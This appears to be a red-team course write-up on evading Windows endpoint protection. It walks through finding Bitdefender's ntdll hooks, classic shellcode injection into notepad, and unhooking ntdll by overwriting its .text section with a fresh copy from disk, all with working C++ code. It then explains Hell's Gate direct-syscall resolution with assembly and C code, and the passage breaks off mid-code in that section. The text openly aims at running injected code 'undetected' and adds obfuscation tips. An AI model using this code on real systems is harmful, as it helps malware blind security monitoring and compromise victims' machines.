<details>
<summary>01 - Process Unhooking - Introduction</summary>

## Overview

Process unhooking is a critical evasion technique that involves identifying and removing or bypassing API hooks placed by security products within process memory. These hooks allow Endpoint Protection Platforms (EPP) and Endpoint Detection and Response (EDR) systems to monitor and intercept system calls.

## How API Hooking Works

### Normal System Call Flow

In an unhooked system, API calls follow this pattern in ntdll.dll:

```assembly
; Typical syscall structure
mov r10, rcx      ; Store first argument
mov eax, [syscall_number]  ; System call ID
syscall           ; Transition to kernel mode
```

Example from NtCreateFile:
```
mov r10, rcx
mov eax, 55h      ; NtCreateFile syscall number
syscall
ret
```

### Hooked System Call Flow

When security products inject their monitoring DLLs, they modify these functions:

```assembly
; Hooked function example (NtAdjustPrivilegesToken)
jmp  7FFCABAF0080        ; Jump to injected code
```

The jump redirects execution to security product code that:
1. Logs the function call and parameters
2. Performs security checks
3. Potentially blocks malicious activity
4. Eventually calls the original function

## Practical Analysis

### Tools Required
- **Debugger**: x64dbg or WinDbg
- **Process Analysis**: Process Hacker or Process Explorer
- **Memory Analysis**: VMMap or similar tools

### Step-by-Step Hook Identification

#### 1. Attach Debugger to Target Process
```batch
# Attach to notepad.exe
x64dbg -> File -> Attach -> notepad.exe
```

<img width="1614" height="802" alt="image" src="https://github.com/user-attachments/assets/66d7ff5f-ff4d-4f6d-967c-7a732b691216" />


#### 2. Examine System Calls in ntdll.dll
- Navigate to ntdll.dll in memory (Symbols tab -> scroll down to ntdll.dll module -> search: token)
  
  <img width="1611" height="795" alt="image" src="https://github.com/user-attachments/assets/d64226ec-032a-49d7-a713-263c5e35cb4e" />

- Locate critical system calls (NtCreateFile, NtAllocateVirtualMemory, etc.)
- Identify jumps replacing normal syscall instructions

  
<img width="1612" height="798" alt="image" src="https://github.com/user-attachments/assets/70cdd977-b6e6-4441-9d2d-6accbde6fe4a" />


If we go to `NtAdjustPrivilegesToken`:

<img width="1611" height="797" alt="image" src="https://github.com/user-attachments/assets/81b9cd7d-173b-496d-8c54-93b191a1f807" />

<img width="1608" height="791" alt="image" src="https://github.com/user-attachments/assets/e10d9ad1-5268-42e9-8d43-b3e9a0ac1653" />

#### 3. Analyze Hook Code

Follow the jump to injected code:
```assembly
; Example hook trampoline
push rax
mov rax, [security_module_address]
ret
```

<img width="1611" height="793" alt="image" src="https://github.com/user-attachments/assets/8c9b82e5-a112-464d-8b7c-cf71333ec9dc" />


#### 4. Identify Injection Method

**Bitdefender Example:**
- Injected shellcode (4KB memory region)
- Contains Unicode strings referencing AV DLL (add-cuf64.dll)
- Shellcode loads the monitoring DLL into the process
- DLL then sets hooks on ntdll functions

### Memory Analysis with Process Hacker

1. **Locate Injected Regions**:
   - Identify private memory regions with unusual permissions
   - Look for small executable regions (4KB-8KB)
   - Check for DLLs not typically loaded by the process
     
     <img width="1617" height="800" alt="image" src="https://github.com/user-attachments/assets/743cc7ca-e7a2-4d73-9286-d1d81f64823f" />


2. **Examine Loaded Modules**:
   - Identify security product DLLs (e.g., add-cuf64.dll for Bitdefender)

     <img width="1004" height="475" alt="image" src="https://github.com/user-attachments/assets/c6c86f90-4509-4cc0-bba4-55d27978a95b" />

     <img width="1042" height="779" alt="image" src="https://github.com/user-attachments/assets/1a175ea8-95c0-4747-af64-2c29cf1c088c" />

   - Note base addresses and memory protections

### Hook Installation Timeline

1. **Process Creation**: Security product detects new process
2. **Shellcode Injection**: Small shellcode injected into process memory
3. **DLL Loading**: Shellcode loads the full monitoring DLL
4. **Hook Placement**: DLL modifies ntdll function prologues with jumps
5. **Monitoring Active**: All system calls are intercepted and logged


<img width="1614" height="802" alt="image" src="https://github.com/user-attachments/assets/b6315bbb-b61c-453d-8894-bbeed23b56c8" />

So let's take a look at how these hooks are, when these hooks are actually set. So let's reload, and now we see anti-dll is being loaded in a process and you see there is are no hooks here.
     
<img width="1610" height="798" alt="image" src="https://github.com/user-attachments/assets/bf0dd36c-9b71-4f68-9d89-f5f9a6b92456" />

So let's run again. We see kernel32 being loaded, and we have our bitdefender dll (`atcuf64.dll  ). 

<img width="1133" height="904" alt="image" src="https://github.com/user-attachments/assets/63bf6ac3-6c39-40f3-8ad8-0588c72e4e06" />

Let's see if there is any shellcode injected  and there is one at this address with only 4kb:

<img width="1010" height="783" alt="image" src="https://github.com/user-attachments/assets/6a2d2da9-d6db-457a-a118-bcdf0657d416" />

Copy "Base address"

<img width="448" height="309" alt="image" src="https://github.com/user-attachments/assets/2727d31d-f65b-4a9a-88cc-3354564b2cf3" />


CTRL + G:

<img width="762" height="233" alt="image" src="https://github.com/user-attachments/assets/e788de91-1759-4f5e-bf52-0e684a3f243b" />

<img width="1610" height="797" alt="image" src="https://github.com/user-attachments/assets/d3733289-8185-4963-bfe0-ab7084827106" />

It doesn't look like much of a code, so let's see it in a dump and now it makes more sense:

<img width="1611" height="796" alt="image" src="https://github.com/user-attachments/assets/3c642faa-f336-4e7f-94e9-6d26b2f1e6c5" />

We see unicode strings, so atcuf64.dll which is the name of our dll and some path as well. So it looks like that AV when it detects the new process creation, it will inject some shellcode with these strings and probably this shellcode will actually load this dll into the process, and we can actually check that. 

So let's set a breakpoint here for memory access:

<img width="960" height="728" alt="image" src="https://github.com/user-attachments/assets/36aa053d-52c0-4abc-8270-d8b7db770ced" />

Let's run it and we have a hit. Once the AV dll is loaded, this library will set those hooks on anti-dll and other libraries:

<img width="1615" height="800" alt="image" src="https://github.com/user-attachments/assets/a4b53ac1-4a74-4329-a394-c9cde1e3e7ac" />


## Technical Details

### Common Hook Locations
- **ntdll.dll**: Primary target for user-to-kernel transitions
- **kernel32.dll**: Windows API functions
- **advapi32.dll**: Security and registry functions
- **ws2_32.dll**: Network functions

### Hook Implementation Variations

Different security vendors use various techniques:

1. **Direct Function Patching**: Overwriting function prologues with jumps
2. **Export Address Table (EAT) Hooking**: Modifying DLL export tables
3. **Import Address Table (IAT) Hooking**: Modifying import tables of loaded modules
4. **Inline Hooking**: Comprehensive function modification

### Detection Methods

#### Memory Permission Analysis
- Hook code often resides in specially allocated memory regions
- Unusual permission combinations (READ-ONLY + EXECUTE)
- Small, isolated executable regions

#### Code Pattern Recognition
- Look for trampoline code patterns
- Identify jumps to unexpected memory locations
- Detect unusual instruction sequences

## Operational Impact

### Why Unhooking Matters
- **Reduces Detection**: Security products cannot monitor system calls
- **Improves Stealth**: Malicious activity appears as normal process behavior
- **Bypasses Behavioral Analysis**: Evades runtime detection mechanisms

### Limitations and Considerations
- **Privilege Requirements**: Often requires high privileges for memory modification
- **Persistence**: Hooks may be re-applied by security products
- **Detection Risk**: Unhooking attempts may trigger alerts in advanced EDRs

---

</details>


<details>
<summary>02 - Hooks vs Code Injections</summary>

### Step 1: Navigate to the Project Folder
[01.ClassicInjection](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/01.ClassicInjection)

### Step 2: Open and Examine implant.cpp in Notepad++

The code template contains classic injection code:

<img width="1587" height="557" alt="image" src="https://github.com/user-attachments/assets/501cc22d-3941-4767-a028-c4caec379fe1" />

<img width="1154" height="727" alt="image" src="https://github.com/user-attachments/assets/1e167d7b-6fff-420c-8ff2-ef5d0ed007f2" />

Our target is Notepad. We begin by using a function to retrieve its process ID. Once we have the ID, we open a handle to the Notepad process. The payload we are injecting is a simple message box.

<img width="1417" height="767" alt="image" src="https://github.com/user-attachments/assets/b1acae2a-07e1-4b35-900c-7f99227f62c8" />

The injection process works as follows: first, we decrypt the payload `AESDecrypt((char *) payload`. Then, we allocate memory within the Notepad process `VirtualAllocEx`, write our payload into that memory space `WriteProcessMemory`, and finally create a remote thread in Notepad to execute it `CreateRemoteThread`.

### Step 3: Compile the Code
```batch
# Run the compilation batch file exactly as shown via Native Tools Command Prompt for VS
compile.bat
```

**Expected Output**: `implant.exe` is created successfully

<img width="978" height="381" alt="image" src="https://github.com/user-attachments/assets/22b1cf3f-3aee-4b0e-8af8-1004aef5d77b" />

### Step 4: First Test in Excluded Folder

#### Run the injection:
```batch
implant.exe
```

#### Check if injection worked:
1. **Open Process Hacker**
2. **Find notepad.exe process**
3. **Examine Memory tab** - look through memory regions one by one
4. **Locate the payload** in notepad's memory - you'll see the shellcode bytes

   <img width="1367" height="845" alt="image" src="https://github.com/user-attachments/assets/44d78b3c-6278-4b94-a1d2-f604155f1df9" />


**Observation**: The injection into Notepad was completed, but the expected payload (a message box) did not appear. The reason for this is straightforward: we had excluded our shellcode folder from Bitdefender's scans.

<img width="1259" height="798" alt="image" src="https://github.com/user-attachments/assets/e6ad0d32-5e8b-4139-8d5e-7573859feaf1" />

At a process level, this exclusion means that no antivirus hooks were placed on the system calls within our implant. 

<img width="1086" height="709" alt="image" src="https://github.com/user-attachments/assets/7d95c86c-06e7-4099-8241-b1d793c6a6ed" />

To verify this, we modified the code by adding printf("lol\n"); getchar();. The getchar() function pauses the execution, giving us time to attach a debugger before any injection occurs.

<img width="971" height="739" alt="image" src="https://github.com/user-attachments/assets/75c60f1a-329d-4155-9541-b81cbdd4091f" />

#### Debugger Analysis (No Hooks):

```batch
# Start x64dbg
x64dbg

# Attach to implant.exe process
File -> Attach -> Select implant.exe
```

```batch
Options tab -> Preferences -> Untick DLL Load
```
<img width="1619" height="796" alt="image" src="https://github.com/user-attachments/assets/83caa8d6-da67-480a-825f-9428f5d19c1a" />

```batch
# Navigate to ntdll.dll symbols
Symbols tab -> ntdll.dll -> Right-click -> Search -> Token

# Examine system calls like NtAdjustPrivilegesToken
```
<img width="1609" height="793" alt="image" src="https://github.com/user-attachments/assets/91459171-e542-4f6f-bfe1-0d1ac36b6a06" />


```batch
# You'll see normal syscall structure:
mov r10, rcx
mov eax, [syscall_number] 
...
ret

# No jumps to external code - hooks are not present
```
<img width="1609" height="790" alt="image" src="https://github.com/user-attachments/assets/b757a13c-5626-454f-a161-bb33f518ddeb" />


### Step 5: Recompile and Test Again
```batch
# Recompile to ensure clean build
compile.bat

# Run again
implant.exe
```

<img width="1612" height="799" alt="image" src="https://github.com/user-attachments/assets/186a95d8-d2a6-4586-9833-a88e6f558df7" />

**Observation**: Injection works without issues in excluded folder

### Step 6: Create Non-Excluded Test Environment

```batch
# Navigate up one level
cd ..

# Create tests folder
mkdir tests

# Go into tests
cd tests

# Copy the implant file implant.exe and rename it to implant-classic.exe

```

<img width="352" height="179" alt="image" src="https://github.com/user-attachments/assets/95fb4576-828a-46a0-aaae-3292a34926cf" />


### Step 7: Test in Non-Excluded Folder

#### First, start notepad manually:
```batch
notepad.exe
```

#### Attach debugger to notepad to verify hooks:
```batch
x64dbg

# Attach to notepad.exe
File -> Attach -> Select implant-classic.exe
```

<img width="1611" height="796" alt="image" src="https://github.com/user-attachments/assets/be6f7c58-b6a5-44f3-9bff-1f910df7c163" />


```batch
# Navigate to ntdll.dll symbols
Symbols -> ntdll.dll -> Search -> Token -> look for NtAdjustPrivilegesToken

# You'll now see HOOKS:
jmp 7FFCABAF0080
...

# These jumps redirect to AV monitoring code
```
<img width="1132" height="281" alt="image" src="https://github.com/user-attachments/assets/57e2940c-074d-4be1-af39-535f6ac26dfe" />

#### Detach debugger and run the injection:

<img width="1612" height="800" alt="image" src="https://github.com/user-attachments/assets/a0b78683-72fd-4ef1-bee1-fb177639bb8f" />

```batch
# Make sure you're in tests folder
compile.bat
implant.exe
```

### Step 8: Observe Security Product Response

**Immediate Results**:
- `implant.exe` process terminated immediately
- `notepad.exe` process terminated immediately
- After a few seconds: Bitdefender popup appears

**Bitdefender Alert**:
```
Malicious application detected
Threat: implant-classic.exe
Action: Removed
Your device is now safe
```

**File System Impact**:
- The entire `classic-injection` folder is completely removed
- All compiled files and source code deleted by Bitdefender

### Step 9: Analysis of What Happened

#### The Detection Chain:
1. **Hooked NtAllocateVirtualMemory** detected executable memory allocation in another process
2. **Hooked NtWriteVirtualMemory** detected writing to executable memory  
3. **Hooked NtCreateThreadEx** detected remote thread creation
4. **Behavioral analysis** recognized this as classic injection pattern
5. **Automatic response** terminated both processes and deleted files

#### Hook Installation Timeline:
1. **Process Creation**: Bitdefender detected notepad.exe starting
2. **Shellcode Injection**: Bitdefender injected 4KB shellcode into notepad
3. **DLL Loading**: Shellcode loaded `add-cuf64.dll` into notepad
4. **API Hooking**: DLL modified ntdll function prologues with jumps to monitoring code

### Step 10: Key Technical Observations

#### In Excluded Folder:
```assembly
; Normal syscall structure in ntdll
ntdll!NtAllocateVirtualMemory:
mov r10, rcx
mov eax, 18h
syscall
ret
```

#### In Non-Excluded Folder:
```assembly
; Hooked function in ntdll
ntdll!NtAllocateVirtualMemory:
jmp 7FFCABAF0080  ; Jump to Bitdefender code

; The hook code at 7FFCABAF0080:
push rax
mov rax, [Bitdefender_function_table]
call [rax+logging_function]  ; Log the API call
pop rax
; Additional checks...
jmp back_to_original_code
```

### Step 11: Memory Analysis Comparison

#### Excluded Folder Process:
- No unusual DLLs loaded
- No small executable memory regions
- Clean ntdll without modifications

#### Non-Excluded Folder Process:
- `add-cuf64.dll` loaded in process memory
- Small 4KB executable regions (shellcode)
- Modified ntdll functions with jumps

### Step 12: Conclusion and Next Steps

**Problem Identified**: Classic injection is easily detected by security product hooks

**Required Solutions**:
1. **Detect and remove hooks** before performing injection
2. **Use direct system calls** to bypass hooked APIs
3. **Implement alternative injection** techniques that don't match known patterns

---

</details>


<details>
<summary>03 - Process Unhooking Classic Method</summary>

## Overview

The classic unhooking method involves loading a fresh, clean copy of ntdll.dll from disk and using it to overwrite the hooked version in memory. This technique removes security product hooks and restores original system call functionality, allowing successful code injection without detection.

<img width="420" height="210" alt="Project Overview" src="https://github.com/user-attachments/assets/327be859-1517-4667-9f4c-abfbf6cc4855" />

## Implementation

### Core Concept

The technique works by:
1. Loading a fresh, unhooked copy of ntdll.dll from disk
2. Parsing PE headers to locate the .text section containing code
3. Overwriting the hooked ntdll in memory with clean code
4. Performing injection using now-unhooked system calls

### Code Implementation

[02.FreshCopy](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/02.FreshCopy)

#### Main Unhooking Flow

```cpp
// 1. Decrypt ntdll.dll path (obfuscated to avoid detection)
XORcrypt((char *) sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);

// 2. Open fresh ntdll.dll from disk
hFile = CreateFile((LPCSTR) sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

// 3. Map file into memory
hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);

// 4. Remove hooks using fresh copy
ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pMapping);

// 5. Perform injection with clean syscalls
// ... injection code ...
```

<img width="1614" height="720" alt="Main unhooking flow code" src="https://github.com/user-attachments/assets/23b20f5a-b07b-4e66-8163-254ef8acc3a8" />

#### Unhooking Function

```cpp
/*
    UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll 
    and copies over the hooked one
*/
DWORD UnhookNtdll(HMODULE hNtdll, LPVOID pMapping) {
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
    
    // Find .text section
    for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
                                            ((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
            // Change memory protection to writable
            VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                            pImgSectionHead->Misc.VirtualSize,
                            PAGE_EXECUTE_READWRITE,
                            &oldprotect);
            
            // Copy fresh .text section over hooked version
            memcpy((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                   (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                   pImgSectionHead->Misc.VirtualSize);

            // Restore original memory protection
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                            pImgSectionHead->Misc.VirtualSize,
                            oldprotect,
                            &oldprotect);
            return 0;
        }
    }
    return -1;
}
```

## Step-by-Step Execution

### Step 1: Environment Setup

```batch
# Create test directory
mkdir C:\tests

# Copy and prepare executable
copy implant.exe C:\tests\implant-fc.exe
```

### Step 2: Compile the Code

```batch
# Run compilation script
compile.bat
```

<img width="908" height="272" alt="Compilation output" src="https://github.com/user-attachments/assets/6874a95e-a19e-4b14-a438-b801a1f61df3" />

### Step 3: Initial Execution

```batch
# Start target process
notepad.exe

# Execute unhooking implant
implant-fc.exe
```

**Output**: `Check 1!` - This indicates the fresh ntdll has been mapped but hooks are still present.

<img width="1437" height="373" alt="Initial execution checkpoint" src="https://github.com/user-attachments/assets/068683e4-98d8-47fd-8542-6a632b7bd232" />

### Step 4: Memory Analysis Before Unhooking

At `Check 1`, we can observe two ntdll instances in memory:

- **Original ntdll**: Loaded by OS with security product hooks
- **Fresh ntdll**: Mapped from disk, clean and unhooked

<img width="1607" height="802" alt="Dual ntdll instances in memory" src="https://github.com/user-attachments/assets/dadd5173-6499-4949-b94b-26f78070ec0e" />

<img width="1615" height="804" alt="Fresh ntdll copy details" src="https://github.com/user-attachments/assets/68a828aa-7e86-49fe-b111-ba5901c6bab5" />

### Step 5: Debugger Analysis - Hooks Present

Attaching a debugger before unhooking reveals hooked functions:

<img width="1611" height="799" alt="Debugger attached to process" src="https://github.com/user-attachments/assets/ecf7d6c8-e878-4357-9ce0-297de7a2504d" />

<img width="1610" height="796" alt="Token privileges examination" src="https://github.com/user-attachments/assets/a809126e-1550-4056-98db-d30bffb2b66b" />

```assembly
; Hooked function example
ntdll!NtAdjustPrivilegesToken:
jmp  7FFCABAF0080      ; Jump to AV monitoring code
```

<img width="1609" height="798" alt="Hooked function visible in debugger" src="https://github.com/user-attachments/assets/bd295c02-4295-4169-8101-26c8f572bd9d" />

### Step 6: Execute Unhooking

Press Enter to continue execution. The program reaches `Check 2!` after the unhooking function completes.

<img width="1607" height="790" alt="Post-unhook checkpoint reached" src="https://github.com/user-attachments/assets/25077889-0c45-44a9-8e76-2158b9deed82" />

### Step 7: Verify Hooks Removed

Re-analyze the ntdll module in debugger:

```assembly
; After unhooking - clean syscall structure
ntdll!NtMapViewOfSection:
mov r10, rcx
mov eax, 28h
syscall
ret
```

<img width="1609" height="793" alt="Clean syscall after unhooking" src="https://github.com/user-attachments/assets/e41920e4-d0aa-4f63-b836-528bf43ad7da" />

Search for other system calls to verify all hooks are removed:

<img width="1611" height="796" alt="Searching for system calls" src="https://github.com/user-attachments/assets/8767c049-2c69-47de-930a-8f8837f5de32" />

All system calls in the .text section are now clean and free from hooks:

<img width="1606" height="798" alt="All syscalls clean after unhooking" src="https://github.com/user-attachments/assets/a4f3f140-f427-448d-9a21-d9c4efb73955" />

### Step 8: Successful Injection

With hooks removed, the injection proceeds undetected:

- Shellcode executes successfully in notepad
- No security product intervention
- MessageBox appears confirming successful execution

<img width="677" height="269" alt="Successful shellcode execution" src="https://github.com/user-attachments/assets/de98d663-9453-4c94-8271-08919237511b" />

<img width="1274" height="391" alt="No detection by security products" src="https://github.com/user-attachments/assets/69c9abb2-bd99-4e9e-9f1e-8bd368c65df0" />

<img width="1283" height="722" alt="Final successful execution result" src="https://github.com/user-attachments/assets/729f264a-12ab-4e39-b2a3-930c7e67bacc" />

## Technical Details

### How the Unhooking Works

1. **PE Header Parsing**: Locates the .text section containing executable code
2. **Memory Protection Modification**: Temporarily makes the .text section writable
3. **Code Overwrite**: Replaces hooked code with clean version from disk
4. **Protection Restoration**: Returns memory to original read/execute permissions

### Critical Components

- **String Obfuscation**: ntdll path is XOR encrypted to avoid static detection
- **Dynamic API Resolution**: VirtualProtect address retrieved at runtime
- **PE Structure Navigation**: Manual parsing of DOS and NT headers
- **Memory Management**: Proper protection flag handling

## Advantages

- **Comprehensive**: Removes all hooks from ntdll in one operation
- **Effective**: Completely bypasses user-mode API monitoring
- **Reliable**: Works across different security products using similar hooking methods
- **Reusable**: Can be integrated into various injection techniques

## Limitations

- **Detection Risk**: Memory protection changes may be monitored
- **Process-Specific**: Only affects current process instance
- **OS Version Dependency**: Fresh ntdll must match running OS version
- **File Access**: Requires read access to system32\ntdll.dll

## Detection Avoidance

- Use obfuscated strings for critical function names
- Implement the unhooking early in execution before monitoring is active
- Consider combining with other evasion techniques for layered protection
- Test against multiple security products for compatibility

## Conclusion

The classic unhooking method provides a robust foundation for bypassing user-mode API hooks. By understanding and implementing this technique, you can effectively neutralize security product monitoring and execute code undetected.

This approach demonstrates the fundamental principle that security products rely on hooking critical system functions, and by restoring these functions to their original state, we can operate without interference.

The step-by-step execution with debugger verification ensures that the unhooking process is complete and effective before proceeding with injection operations.

</details>


<details>
<summary>04 - Hooks vs Hells Gate</summary>

## Overview

Hells Gate is an advanced technique that dynamically resolves system call numbers at runtime, eliminating the need for hardcoded values that change between Windows versions. This method bypasses API hooks by making direct system calls while maintaining compatibility across different Windows releases.

## The Problem: Changing Syscall Numbers

System call numbers change with every Windows release:

| Windows Version | NtCreateThread Syscall Number |
|----------------|------------------------------|
| Windows 7      | 0x4B                         |
| Windows 10 1809| 0x4C                         |
| Windows 10 1903| 0x4E                         |

Hardcoding these values creates maintenance overhead and version dependency.

One way to deal with this problem is to dynamically detect which version of windows our code is running on and then use specific system call numbers for that version. But this requires implementing a lot of redundant code. Smelly and Evansac implemented a technique called HellsGate which tries to resolve these system call numbers dynamically without a need to  hard code them inside your program.

<img width="404" height="286" alt="image" src="https://github.com/user-attachments/assets/b9ae0a8b-bc84-49bd-a837-9dd311f31540" />

[HellsGate PDF Documentation](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/blob/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/03.HellsGate/hells-gate.pdf)

## Implementation Architecture

### Core Components

[01.Unhooks/03.HellsGate](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/03.HellsGate)

#### 1. Assembly Stubs (HellsGate.asm)

Let's examine the code, which has two main and most important components.

The first is `hellsgate.asm`, a file containing two very simple assembly functions. One is named `HellsGate`, and the other is `HellDescent`.

The `HellsGate` function performs a single, specific task: it takes a function parameter stored in the `ECX` register and copies its value into a global variable named `wSystemCall`.

```nasm
.data
	wSystemCall DWORD 000h

.code 
	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	HellsGate ENDP

	HellDescent PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	HellDescent ENDP
end
```

The second function, `HellDescent`, is essentially a system call stub. When this function is called, it executes the actual system call into the kernel. It does this by using the system call number stored in the global variable that was previously set by `HellsGate`. That is the core functionality of the assembly part.

#### 2. Syscall Table Structure

The second crucial component is the C code `main.c` file. This is slightly more complex, but not overwhelmingly so. The entire HellsGate technique relies on two tables—or, more precisely, one table and two corresponding data structures.

<img width="1609" height="802" alt="image" src="https://github.com/user-attachments/assets/a0b543fb-c0c1-49df-8965-5c807fd5fed1" />

The first structure is called the `VX_TABLE`, which is essentially an array of structures, each of type `VX_TABLE_ENTRY`.

A `VX_TABLE_ENTRY` is composed of three elements:
1.  **pAddress:** A pointer that holds the address of a function.
2.  **Hash (dwHash):** A 64-bit integer that uniquely identifies that function.
3.  **Syscall (wSystemCall):** The number corresponding to the system call for that function.

In this particular implementation, the `VX_TABLE` is populated with information for only four critical system calls:
*   `NtAllocateVirtualMemory`
*   `NtProtectVirtualMemory`
*   `NtCreateThreadEx`
*   `NtWaitForSingleObject`

An important principle to note here is that the HellsGate technique is designed to use functions exclusively from `ntdll.dll`. It intentionally does not rely on any additional DLLs, such as `kernel32.dll` or `user32.dll`, utilizing only `ntdll` to perform its operations.

## Detailed Technical Process

### The Resolution Workflow

The HellsGate technique follows a systematic approach to resolve and utilize system calls:

1. **PEB Navigation**: Access the Process Environment Block to locate NTDLL
2. **PE Parsing**: Extract the export directory from NTDLL's headers
3. **Function Hashing**: Use DJB2 algorithm to identify target functions
4. **Syscall Extraction**: Scan function prologues for syscall patterns
5. **Table Population**: Store resolved addresses and numbers in VX_TABLE
6. **Execution**: Use assembly gates to invoke syscalls directly

### DJB2 Hash Algorithm

The implementation uses the DJB2 hash function created by Daniel J. Bernstein:
```c
DWORD64 HashStringDjb2(const char* str) {
    DWORD64 hash = 5381;
    int c;
    while (c = *str++) {
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    }
    return hash;
}
```

### Syscall Stub Pattern

The characteristic syscall stub pattern that HellsGate searches for:
```
4C 8B D1          ; MOV R10, RCX    (Standard syscall convention)
B8 ?? ?? 00 00    ; MOV EAX, syscall_number
0F 05             ; SYSCALL
```

The two bytes after `B8` contain the system call number in little-endian format.

## Step-by-Step Implementation

<img width="1609" height="803" alt="image" src="https://github.com/user-attachments/assets/cc543526-5f67-44a0-b64a-afe89e8e5603" />

### Step 1: Locate ntdll.dll in Memory

Now, why is this `VX_TABLE` so important? This table holds all the necessary information to call these four `Nt*` functions directly. However, to call them, we must first resolve their corresponding system call numbers.

To find a specific system call number, we must parse the `ntdll.dll` that is loaded in memory. We obtain the address of `ntdll.dll` by utilizing the Process Environment Block (PEB). 

<img width="1601" height="401" alt="image" src="https://github.com/user-attachments/assets/98a4f860-e22f-4971-9788-d105a8e75784" />

The PEB contains a pointer to a doubly linked list called the In-Memory Order Module List, which holds all modules loaded in the process. The first module in this list is the process image itself, and the second is always `ntdll.dll`. By reading from this list, we get the base address of `ntdll.dll` in our process.

**Code Implementation:**
```c
PPEB pPeb = (PPEB)__readgsqword(0x60);
PLIST_ENTRY pListEntry = pPeb->Ldr->InMemoryOrderModuleList.Flink;
pListEntry = pListEntry->Flink;  // First is executable, second is NTDLL
PLDR_DATA_TABLE_ENTRY pLdrEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
PVOID pNtdllBase = pLdrEntry->DllBase;
```

### Step 2: Parse PE Headers for Export Directory

The next step is to extract the Export Directory from `ntdll.dll`. This is done with a helper function `GetImageExportDirectory` that simply parses the PE headers to locate and return the export directory.

<img width="1609" height="613" alt="image" src="https://github.com/user-attachments/assets/3db07920-2c8d-4030-b538-ee714e5cee45" />

Once we have the export directory, we are ready to parse `ntdll.dll` and search for the system calls we are interested in.

<img width="1614" height="687" alt="image" src="https://github.com/user-attachments/assets/8dff01fb-1a09-43ab-84a3-368edbc0964e" />

For each of the four functions (e.g., `NtAllocateVirtualMemory`, `NtCreateThreadEx`, `NtProtectVirtualMemory` and `NtWaitForSingleObject`), we store a hash of the function name.  

<img width="1607" height="579" alt="image" src="https://github.com/user-attachments/assets/f6932274-3522-43b0-9dfa-8ff9dfca1c12" />

This implementation uses the `djb2` hash function, created by Daniel J. Bernstein.

<img width="1614" height="709" alt="image" src="https://github.com/user-attachments/assets/5662d21f-815a-463e-a900-f8d9c699f776" />

 <img width="1610" height="496" alt="image" src="https://github.com/user-attachments/assets/4c5aebec-65e1-4406-899f-17a2a4894b7b" />

 ### Step 3: Resolve Function Addresses and Syscall Numbers
 
We then call a function to locate this hash within the `ntdll.dll` export table. This function works by iterating through the Export Address Table in a loop, comparing the hash of each exported function name against the hash we are seeking. When a match is found, the address of that function is stored in our `VX_TABLE_ENTRY` structure.

<img width="1606" height="711" alt="image" src="https://github.com/user-attachments/assets/55675f73-7980-43bb-be1c-53b6f0587c09" />

**Export Table Enumeration:**
```c
PDWORD pAddressOfFunctions = (PDWORD)((PBYTE)pDllBase + pExportDir->AddressOfFunctions);
PDWORD pAddressOfNames = (PDWORD)((PBYTE)pDllBase + pExportDir->AddressOfNames);
PWORD pAddressOfNameOrdinals = (PWORD)((PBYTE)pDllBase + pExportDir->AddressOfNameOrdinals);

for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
    const char* pFunctionName = (const char*)pDllBase + pAddressOfNames[i];
    DWORD64 functionHash = HashStringDjb2(pFunctionName);
    
    if (functionHash == pVxEntry->dwHash) {
        pVxEntry->pAddress = (PVOID)((PBYTE)pDllBase + 
                                   pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        break;
    }
}
```

### Step 4: Extract Syscall Number from Function Stub

The final step is to find the system call number for that function. This is done in a subsequent loop `while (TRUE)` that searches for the specific byte sequence of the system call stub. 
<img width="1610" height="698" alt="image" src="https://github.com/user-attachments/assets/79a0b24a-0f1b-47cd-9210-a4cd8423cf28" />

The critical bytes we look for are:
*   `4C 8B D1`, which translates to the assembly instruction `mov r10, rcx`.
*   `B8`, which is the `mov eax, ...` opcode. The next four bytes after `B8` contain the system call number.
    <img width="1612" height="807" alt="image" src="https://github.com/user-attachments/assets/a30d4015-2a22-42b8-85cc-e7b6685a9b8e" />

**Syscall Extraction Code:**
```c
PBYTE pFunctionBytes = (PBYTE)pVxEntry->pAddress;
for (WORD idx = 0; idx < 500; idx++) {
    if (pFunctionBytes[idx] == 0x4C &&
        pFunctionBytes[idx + 1] == 0x8B &&
        pFunctionBytes[idx + 2] == 0xD1 &&
        pFunctionBytes[idx + 3] == 0xB8 &&
        pFunctionBytes[idx + 6] == 0x00 &&
        pFunctionBytes[idx + 7] == 0x00) {
        
